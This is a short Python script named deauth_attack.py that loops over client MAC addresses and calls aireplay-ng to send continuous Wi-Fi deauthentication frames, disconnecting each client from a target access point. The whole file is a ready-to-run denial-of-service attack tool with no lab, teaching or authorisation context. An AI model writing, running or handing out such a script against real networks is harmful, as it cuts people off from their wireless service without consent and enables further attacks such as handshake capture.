import sys
import subprocess

def run_deauth_attack(bssid, interface, clients):
    for client in clients:
        aireplay_cmd = ["sudo", "aireplay-ng", "-0", "0", "-a", bssid, "-c", client, interface]
        subprocess.run(aireplay_cmd)

if __name__ == "__main__":
    if len(sys.argv) < 3:
        print("Usage: python3 deauth_attack.py <BSSID> <INTERFACE> <CLIENT1> [<CLIENT2> ...]")
        sys.exit(1)

    bssid = sys.argv[1]
    interface = sys.argv[2]
    clients = sys.argv[3:]

    run_deauth_attack(bssid, interface, clients)
